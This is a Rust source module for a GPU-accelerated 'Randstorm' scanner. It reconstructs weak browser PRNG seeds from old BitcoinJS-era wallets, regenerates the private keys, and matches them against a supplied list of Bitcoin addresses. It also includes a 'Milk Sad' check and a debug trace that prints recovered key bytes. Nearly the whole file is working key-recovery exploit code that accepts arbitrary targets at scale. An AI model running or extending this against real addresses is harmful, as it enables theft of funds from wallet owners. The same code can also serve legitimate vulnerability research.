use super::config::{ScanConfig, ScanMode};
/// Integration layer for Randstorm scanner
///
/// Orchestrates PRNG reconstruction, fingerprint database, GPU acceleration,
/// and wallet address derivation to detect vulnerable wallets.
use super::fingerprints::{BrowserConfig, FingerprintDatabase, Phase, TimestampGenerator};
use super::gpu_integration::{GpuScanner, MatchedKey};
use super::prng::{MathRandomEngine, SeedComponents};
use super::progress::ProgressTracker;
use anyhow::{Context, Result};
use bitcoin::{Address, Network, PrivateKey, PublicKey};
use tracing::{info, warn};

/// Vulnerability finding result
#[derive(Debug, Clone)]
pub struct VulnerabilityFinding {
    pub address: String,
    pub confidence: Confidence,
    pub browser_config: BrowserConfig,
    pub timestamp: u64,
    pub derivation_path: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    High,
    Medium,
    Low,
}

/// Main Randstorm scanner
pub struct RandstormScanner {
    database: FingerprintDatabase,
    config: ScanConfig,
    gpu_scanner: Option<GpuScanner>,
    #[cfg(feature = "wgpu")]
    wgpu_scanner: Option<super::wgpu_integration::WgpuScanner>,
    secp: bitcoin::secp256k1::Secp256k1<bitcoin::secp256k1::All>,
    engine: MathRandomEngine,
    golden_reference: super::cpu::GoldenReferenceScanner,
}

impl RandstormScanner {
    /// Create new scanner instance
    pub fn new() -> Result<Self> {
        Self::with_config(ScanConfig::default(), MathRandomEngine::V8Mwc1616)
    }

    /// Create scanner with custom configuration
    pub fn with_config(config: ScanConfig, engine: MathRandomEngine) -> Result<Self> {
        let database = FingerprintDatabase::load_comprehensive()
            .context("Failed to load comprehensive fingerprint database")?;

        let mut gpu_scanner = None;
        #[cfg(feature = "wgpu")]
        let wgpu_scanner: Option<super::wgpu_integration::WgpuScanner> = None;

        use super::config::GpuBackend;

        if config.use_gpu {
            match config.gpu_backend {
                GpuBackend::Auto => {
                    #[cfg(target_os = "macos")]
                    {
                        #[cfg(feature = "wgpu")]
                        let mut wgpu_scanner = wgpu_scanner;
                        #[cfg(feature = "wgpu")]
                        if let Ok(scanner) = super::wgpu_integration::WgpuScanner::new(config.clone(), engine, None, true) {
                            info!("\u{2705} Auto-selected WGPU (Metal) backend");
                            wgpu_scanner = Some(scanner);
                        }
                        #[cfg(feature = "wgpu")]
                        let wgpu_active = wgpu_scanner.is_some();
                        #[cfg(not(feature = "wgpu"))]
                        let wgpu_active = false;
                        if !wgpu_active {
                            #[cfg(feature = "gpu")]
                            if let Ok(scanner) = GpuScanner::new(config.clone(), engine, None, true) {
                                info!("\u{2705} Fallback to Legacy GPU (OpenCL)");
                                gpu_scanner = Some(scanner);
                            }
                        }
                    }
                    #[cfg(not(target_os = "macos"))]
                    {
                        let mut wgpu_success = false;
                        #[cfg(feature = "wgpu")]
                        {
                            match super::wgpu_integration::WgpuScanner::new(config.clone(), engine, None, true) {
                                Ok(_scanner) => {
                                    info!("\u{2705} Auto-selected WGPU (Vulkan) backend");
                                    wgpu_success = true;
                                }
                                Err(e) => warn!("WGPU (Vulkan) initialization failed: {}", e),
                            }
                        }
                        if !wgpu_success {
                            #[cfg(feature = "gpu")]
                            match GpuScanner::new(config.clone(), engine, None, true) {
                                Ok(scanner) => {
                                    info!("\u{2705} Fallback to OpenCL backend");
                                    gpu_scanner = Some(scanner);
                                }
                                Err(e) => warn!("OpenCL initialization also failed: {}", e),
                            }
                        }
                    }
                }
                GpuBackend::Wgpu => {
                    #[cfg(feature = "wgpu")]
                    match super::wgpu_integration::WgpuScanner::new(config.clone(), engine, None, true) {
                        Ok(_scanner) => info!("\u{2705} Forced WGPU backend enabled"),
                        Err(e) => warn!("Forced WGPU initialization failed: {}", e),
                    }
                    #[cfg(not(feature = "wgpu"))]
                    warn!("WGPU feature not compiled in!");
                }
                GpuBackend::OpenCl => {
                    #[cfg(feature = "gpu")]
                    match GpuScanner::new(config.clone(), engine, None, true) {
                        Ok(scanner) => {
                            info!("\u{2705} Forced OpenCL backend enabled");
                            gpu_scanner = Some(scanner);
                        }
                        Err(e) => warn!("Forced OpenCL initialization failed: {}", e),
                    }
                    #[cfg(not(feature = "gpu"))]
                    warn!("OpenCL feature not compiled in!");
                }
                GpuBackend::Cpu => {
                    info!("GPU disabled by config (Cpu backend selected)");
                }
            }
        } else {
            info!("GPU acceleration disabled by config");
        }

        #[cfg(feature = "wgpu")]
        let any_gpu = gpu_scanner.is_some() || wgpu_scanner.is_some();
        #[cfg(not(feature = "wgpu"))]
        let any_gpu = gpu_scanner.is_some();

        if config.use_gpu && !any_gpu && config.gpu_backend != GpuBackend::Cpu {
            warn!("\u{26a0}\u{fe0f}  GPU requested but no backend initialized. Falling back to CPU.");
        }

        Ok(Self {
            database,
            config,
            gpu_scanner,
            #[cfg(feature = "wgpu")]
            wgpu_scanner,
            secp: bitcoin::secp256k1::Secp256k1::new(),
            engine,
            golden_reference: super::cpu::GoldenReferenceScanner::new(),
        })
    }

    /// Get the currently active backend
    pub fn active_backend(&self) -> super::config::GpuBackend {
        use super::config::GpuBackend;
        #[cfg(feature = "wgpu")]
        if self.wgpu_scanner.is_some() {
            return GpuBackend::Wgpu;
        }
        if self.gpu_scanner.is_some() { GpuBackend::OpenCl } else { GpuBackend::Cpu }
    }

    /// Scan with GPU acceleration and progress tracking
    #[allow(unused_variables)]
    pub fn scan_with_progress(
        &mut self,
        target_addresses: &[String],
        phase: Phase,
    ) -> Result<Vec<VulnerabilityFinding>> {
        let address_hashes = self.prepare_target_addresses(target_addresses)?;
        let configs: Vec<BrowserConfig> = self.database.get_configs_for_phase(phase).to_vec();

        let mut streaming = StreamingScan::new(configs, &self.config);
        let mut lookahead = streaming.next_fingerprint();
        if lookahead.is_none() {
            anyhow::bail!("No fingerprints generated \u{2014} check timestamp range and configs");
        }
        let mut findings: Vec<VulnerabilityFinding> = Vec::new();

        let total_fingerprints = streaming.total_fingerprints();
        let target_total = if let Some(max) = self.config.max_fingerprints {
            total_fingerprints.min(max)
        } else {
            total_fingerprints
        };

        #[cfg(feature = "gpu")]
        let bloom_filter = if self.gpu_scanner.is_some() {
            use crate::utils::gpu_bloom_filter::{GpuBloomConfig, GpuBloomFilter};
            let bloom_cfg = GpuBloomConfig {
                expected_items: target_addresses.len(),
                fp_rate: 0.0001,
                num_hashes: 15,
            };
            let mut bloom = GpuBloomFilter::new(
                self.gpu_scanner.as_ref().unwrap().queue().clone(),
                bloom_cfg,
            )?;
            bloom.populate_from_hashes(&address_hashes)?;
            Some(bloom)
        } else {
            None
        };

        info!("\u{1f50d} Starting Randstorm scan");
        info!("   Phase: {:?}", phase);
        info!("   Targets: {}", target_addresses.len());
        info!("   Fingerprints (est.): {}", target_total);
        info!("   Scan mode: {:?}", self.config.scan_mode);

        let mut progress = ProgressTracker::new(target_total);
        let mut total_processed: u64 = 0;

        let mut batch_capacity = self.config.batch_size.unwrap_or(100_000);
        if batch_capacity == 0 { batch_capacity = 10_000; }

        loop {
            if let Some(max) = self.config.max_fingerprints {
                if total_processed >= max { break; }
            }

            let mut batch = Vec::with_capacity(batch_capacity);
            if let Some(fp) = lookahead.take() { batch.push(fp); }
            while batch.len() < batch_capacity {
                match streaming.next_fingerprint() {
                    Some(fp) => batch.push(fp),
                    None => break,
                }
            }
            if batch.is_empty() { break; }

            let mut batch_matches = 0usize;
            let mut processed_via_gpu = false;

            // 1. WGPU path — uses sweep() which dispatches the WGSL compute shader
            #[cfg(feature = "wgpu")]
            if let Some(ref wgpu) = self.wgpu_scanner {
                if total_processed == 0 {
                    warn!("\u{26a0}\u{fe0f}  WGPU MODE: ECC/Hashing not yet fully implemented in WGSL (Epic 3).");
                }

                // Build bloom bytes from address hashes
                let bloom_bytes = {
                    use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};
                    let bloom_cfg = GpuBloomConfig {
                        expected_items: target_addresses.len(),
                        fp_rate: 0.0001,
                        num_hashes: 15,
                    };
                    compute_bloom_bits(&address_hashes, bloom_cfg.calculate_filter_size(), 15)
                };

                // Derive timestamp range from batch fingerprints
                let start_ms = batch.iter().map(|fp| fp.timestamp_ms).min().unwrap_or(0);
                let end_ms   = batch.iter().map(|fp| fp.timestamp_ms).max().unwrap_or(0);
                // Use the configured scan interval (1 ms for exhaustive, or coarser)
                let interval_ms = self.config.scan_mode.interval_ms().min(1_000) as u32;

                match wgpu.sweep(start_ms, end_ms, interval_ms, &bloom_bytes) {
                    Ok(seed_hits) => {
                        total_processed = total_processed.saturating_add(batch.len() as u64);
                        batch_matches   = seed_hits.len();

                        // Map SeedComponents hits → VulnerabilityFinding
                        for seed in seed_hits {
                            // Use the first matching fingerprint in the batch for metadata
                            let fp_meta = batch.iter()
                                .find(|fp| fp.timestamp_ms == seed.timestamp_ms)
                                .cloned()
                                .unwrap_or_else(|| batch[0].clone());

                            let browser_config = BrowserConfig {
                                priority:              1,
                                user_agent:            fp_meta.user_agent.clone(),
                                screen_width:          seed.screen_width,
                                screen_height:         seed.screen_height,
                                color_depth:           seed.color_depth as u8,
                                timezone_offset:       seed.timezone_offset as i16,
                                language:              fp_meta.language.clone(),
                                platform:              fp_meta.platform.clone(),
                                market_share_estimate: 0.0,
                                year_min:              2014,
                                year_max:              2016,
                            };

                            // Resolve hash160 → address string
                            let matched_addr = if let Some(h160_words) = seed.hash160 {
                                let mut h160_bytes = [0u8; 20];
                                for (i, w) in h160_words.iter().enumerate() {
                                    let b = w.to_le_bytes();
                                    h160_bytes[i * 4..i * 4 + 4].copy_from_slice(&b);
                                }
                                target_addresses.iter()
                                    .zip(address_hashes.iter())
                                    .find(|(_, h)| h.as_slice() == &h160_bytes)
                                    .map(|(a, _)| a.clone())
                                    .unwrap_or_else(|| "(unknown)".to_string())
                            } else {
                                "(unknown)".to_string()
                            };

                            info!("\u{1f3af} GPU Hit: {} @ ts={}", matched_addr, seed.timestamp_ms);

                            findings.push(VulnerabilityFinding {
                                address:         matched_addr,
                                confidence: match phase {
                                    Phase::One   => Confidence::High,
                                    Phase::Two   => Confidence::Medium,
                                    Phase::Three => Confidence::Low,
                                },
                                browser_config,
                                timestamp:       seed.timestamp_ms,
                                derivation_path: "m/0".to_string(),
                            });
                        }
                        processed_via_gpu = true;
                    }
                    Err(e) => warn!("WGPU sweep failed: {}", e),
                }
            }

            // 2. Fallback to Legacy OpenCL
            #[cfg(feature = "gpu")]
            if !processed_via_gpu {
                if let Some(ref mut gpu) = self.gpu_scanner {
                    let bloom_ref = bloom_filter.as_ref().map(|b| b.buffer());
                    match gpu.process_batch(&batch, &address_hashes, target_addresses.len() as u32, bloom_ref) {
                        Ok(result) => {
                            total_processed = total_processed.saturating_add(result.keys_processed);
                            batch_matches   = result.matches_found.len();
                            for matched in result.matches_found {
                                findings.push(self.match_to_finding(matched, phase)?);
                            }
                            processed_via_gpu = true;
                        }
                        Err(e) => warn!("Legacy GPU batch processing failed: {}", e),
                    }
                }
            }

            // 3. CPU fallback
            if !processed_via_gpu {
                let cpu_results = self.cpu_scan_batch(target_addresses, &address_hashes, &batch)?;
                total_processed = total_processed.saturating_add(batch.len() as u64);
                batch_matches   = cpu_results.len();
                findings.extend(cpu_results);
            }

            // Milk Sad integration
            for fp in &batch {
                let milk_sad_hits = crate::scans::randstorm::heuristics::check_milk_sad_against_hashes(
                    fp.timestamp_ms,
                    &address_hashes,
                );
                for (addr, info) in milk_sad_hits {
                    findings.push(VulnerabilityFinding {
                        address: addr,
                        confidence: Confidence::High,
                        browser_config: BrowserConfig {
                            priority: 10,
                            user_agent: "Milk Sad (Libbitcoin bx 3.x)".to_string(),
                            screen_width: 0, screen_height: 0,
                            color_depth: 0, timezone_offset: 0,
                            language: "en".to_string(), platform: "cli".to_string(),
                            market_share_estimate: 0.0,
                            year_min: 2011, year_max: 2023,
                        },
                        timestamp: fp.timestamp_ms,
                        derivation_path: info,
                    });
                    batch_matches += 1;
                }
            }

            progress.update(batch.len() as u64, batch_matches as u64);
            progress.print_update();
        }

        info!("\n\u{2705} Scan complete!");
        info!("   Total processed: {}", progress.processed());
        info!("   Matches found: {}", findings.len());
        info!("   Time elapsed: {:?}", progress.elapsed());

        Ok(findings)
    }

    /// Prepare target addresses for GPU comparison
    fn prepare_target_addresses(&self, addresses: &[String]) -> Result<Vec<Vec<u8>>> {
        use bitcoin::Address;
        use std::str::FromStr;

        let mut result: Vec<Vec<u8>> = Vec::with_capacity(addresses.len());
        for addr_str in addresses {
            let address = Address::from_str(addr_str)
                .context(format!("Invalid Bitcoin address: {}", addr_str))?
                .assume_checked();
            let script_pubkey = address.script_pubkey();
            if script_pubkey.is_p2pkh() {
                result.push(script_pubkey.as_bytes()[3..23].to_vec());
            } else if script_pubkey.is_p2sh() {
                result.push(script_pubkey.as_bytes()[2..22].to_vec());
            } else {
                anyhow::bail!("Address type not supported for Randstorm scanning: {}", addr_str);
            }
        }
        Ok(result)
    }

    #[allow(dead_code)]
    fn match_to_finding(&self, matched: MatchedKey, phase: Phase) -> Result<VulnerabilityFinding> {
        let browser_config = BrowserConfig {
            priority: 1,
            user_agent: matched.fingerprint.user_agent.clone(),
            screen_width: matched.fingerprint.screen_width,
            screen_height: matched.fingerprint.screen_height,
            color_depth: 24,
            timezone_offset: matched.fingerprint.timezone_offset as i16,
            language: matched.fingerprint.language.clone(),
            platform: matched.fingerprint.platform.clone(),
            market_share_estimate: 0.0,
            year_min: 2014,
            year_max: 2016,
        };
        Ok(VulnerabilityFinding {
            address: matched.address,
            confidence: match phase {
                Phase::One   => Confidence::High,
                Phase::Two   => Confidence::Medium,
                Phase::Three => Confidence::Low,
            },
            browser_config,
            timestamp: matched.fingerprint.timestamp_ms,
            derivation_path: "m/0".to_string(),
        })
    }

    #[allow(dead_code)]
    fn cpu_scan_batch(
        &self,
        target_addresses: &[String],
        target_hashes: &[Vec<u8>],
        fingerprints: &[super::fingerprint::BrowserFingerprint],
    ) -> Result<Vec<VulnerabilityFinding>> {
        use rayon::prelude::*;
        let engine = self.engine;

        let findings: Vec<VulnerabilityFinding> = fingerprints
            .par_iter()
            .filter_map(|fp| {
                use bitcoin::secp256k1::Secp256k1;
                if fp.timestamp_ms == 1366027200000 {
                    println!("SCANNER HIT TIMESTAMP: {}", fp.timestamp_ms);
                }
                let secp = Secp256k1::new();
                let key_bytes = super::prng::bitcoinjs_v013::BitcoinJsV013Prng::generate_privkey_bytes(
                    fp.timestamp_ms, engine, None,
                );
                if let Ok(secret_key) = bitcoin::secp256k1::SecretKey::from_slice(&key_bytes) {
                    let public_key = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
                    let address_hash = super::derivation::derive_address_hash(&public_key);
                    if fp.timestamp_ms == 1366027200000 {
                        println!("SCANNER TRACE: TS={} Key={} Hash={}",
                            fp.timestamp_ms, hex::encode(key_bytes), hex::encode(address_hash));
                    }
                    for (idx, target_hash) in target_hashes.iter().enumerate() {
                        if address_hash.as_slice() == target_hash.as_slice() {
                            return Some(VulnerabilityFinding {
                                address: target_addresses[idx].clone(),
                                confidence: Confidence::High,
                                browser_config: BrowserConfig {
                                    priority: 1,
                                    user_agent: fp.user_agent.clone(),
                                    screen_width: fp.screen_width,
                                    screen_height: fp.screen_height,
                                    color_depth: 24,
                                    timezone_offset: fp.timezone_offset as i16,
                                    language: fp.language.clone(),
                                    platform: fp.platform.clone(),
                                    market_share_estimate: 0.0,
                                    year_min: 2014,
                                    year_max: 2016,
                                },
                                timestamp: fp.timestamp_ms,
                                derivation_path: "direct".to_string(),
                            });
                        }
                    }
                }
                None
            })
            .collect();
        Ok(findings)
    }

    pub fn scan(&mut self, address: &str, phase: Phase) -> Result<Option<VulnerabilityFinding>> {
        let findings = self.scan_with_progress(&[address.to_string()], phase)?;
        Ok(findings.into_iter().find(|f| f.address == address))
    }

    #[allow(dead_code)]
    fn derive_direct_key(&self, prng_bytes: &[u8; 32]) -> Result<Address> {
        let privkey = PrivateKey::from_slice(prng_bytes, Network::Bitcoin)
            .context("Invalid private key from PRNG")?;
        let pubkey = PublicKey::from_private_key(&self.secp, &privkey);
        Ok(Address::p2pkh(&pubkey, Network::Bitcoin))
    }

    #[allow(dead_code)]
    fn config_to_seed(&self, config: &BrowserConfig, timestamp: u64) -> SeedComponents {
        SeedComponents {
            timestamp_ms:    timestamp,
            user_agent:      config.user_agent.clone(),
            screen_width:    config.screen_width,
            screen_height:   config.screen_height,
            color_depth:     config.color_depth,
            timezone_offset: config.timezone_offset,
            language:        config.language.clone(),
            platform:        config.platform.clone(),
            hash160:         None,
        }
    }
}

impl Default for RandstormScanner {
    fn default() -> Self {
        Self::new().expect("Failed to initialize scanner")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let scanner = RandstormScanner::new();
        assert!(scanner.is_ok());
    }

    #[test]
    fn test_direct_key_derivation() {
        let scanner = RandstormScanner::new().unwrap();
        let mut prng_bytes = [0u8; 32];
        prng_bytes[31] = 1;
        let result = scanner.derive_direct_key(&prng_bytes);
        assert!(result.is_ok());
        assert!(result.unwrap().to_string().starts_with('1'));
    }

    #[test]
    fn test_config_to_seed() {
        let scanner = RandstormScanner::new().unwrap();
        let config = BrowserConfig {
            priority: 1,
            user_agent: "Mozilla/5.0 (Windows NT 6.1) Chrome/25.0".to_string(),
            screen_width: 1366, screen_height: 768, color_depth: 24,
            timezone_offset: -300,
            language: "en-US".to_string(), platform: "Win32".to_string(),
            market_share_estimate: 0.1, year_min: 2011, year_max: 2015,
        };
        let seed = scanner.config_to_seed(&config, 1234567890000);
        assert_eq!(seed.timestamp_ms, 1234567890000);
        assert_eq!(seed.screen_width, 1366);
        assert_eq!(seed.screen_height, 768);
    }
}

/// Streaming scan infrastructure for massive-scale Randstorm scanning
pub struct StreamingScan {
    configs: Vec<BrowserConfig>,
    timestamp_gen: TimestampGenerator,
    current_config_idx: usize,
    scan_mode: ScanMode,
}

impl StreamingScan {
    pub fn new(configs: Vec<BrowserConfig>, config: &ScanConfig) -> Self {
        let interval_ms = config.scan_mode.interval_ms();
        let timestamp_gen = if let Some(target) = config.target_timestamp {
            let window = config.timestamp_window.unwrap_or(31_536_000_000);
            TimestampGenerator::new_spiral(target, window, interval_ms)
        } else {
            let start_ms = config.start_date_ms.unwrap_or(1306886400000);
            let end_ms   = config.end_date_ms.unwrap_or(1435708799000);
            TimestampGenerator::new(start_ms, end_ms, interval_ms)
        };
        Self { configs, timestamp_gen, current_config_idx: 0, scan_mode: config.scan_mode }
    }

    pub fn with_time_range(
        configs: Vec<BrowserConfig>,
        scan_mode: ScanMode,
        start_ms: u64,
        end_ms: u64,
    ) -> Self {
        let interval_ms = scan_mode.interval_ms();
        Self {
            configs,
            timestamp_gen: TimestampGenerator::new(start_ms, end_ms, interval_ms),
            current_config_idx: 0,
            scan_mode,
        }
    }

    pub fn next_fingerprint(&mut self) -> Option<super::fingerprint::BrowserFingerprint> {
        use super::fingerprint::BrowserFingerprint;
        if self.configs.is_empty() { return None; }
        if let Some(ts) = self.timestamp_gen.next() {
            let config = &self.configs[self.current_config_idx];
            return Some(BrowserFingerprint::from_config_and_timestamp(config, ts));
        }
        self.current_config_idx += 1;
        if self.current_config_idx >= self.configs.len() { return None; }
        self.timestamp_gen.reset();
        self.next_fingerprint()
    }

    pub fn total_fingerprints(&self) -> u64 {
        self.timestamp_gen.len() * self.configs.len() as u64
    }

    pub fn scan_mode(&self) -> ScanMode {
        self.scan_mode
    }
}

#[cfg(test)]
mod streaming_tests {
    use super::*;

    #[test]
    fn test_streaming_scan_iteration() {
        let configs = vec![
            BrowserConfig {
                priority: 1, user_agent: "Chrome/25".to_string(),
                screen_width: 1366, screen_height: 768, color_depth: 24,
                timezone_offset: -300, language: "en-US".to_string(),
                platform: "Win32".to_string(), market_share_estimate: 0.5,
                year_min: 2011, year_max: 2015,
            },
            BrowserConfig {
                priority: 2, user_agent: "Chrome/30".to_string(),
                screen_width: 1920, screen_height: 1080, color_depth: 24,
                timezone_offset: -300, language: "en-US".to_string(),
                platform: "Win32".to_string(), market_share_estimate: 0.3,
                year_min: 2012, year_max: 2015,
            },
        ];
        let start_ms = 1293840000000;
        let end_ms   = 1293926400000;
        let mut scan = StreamingScan::with_time_range(configs, ScanMode::Standard, start_ms, end_ms);
        let mut count = 0;
        while scan.next_fingerprint().is_some() { count += 1; }
        assert_eq!(count, 48, "Expected 24 timestamps \u{00d7} 2 configs");
    }
}
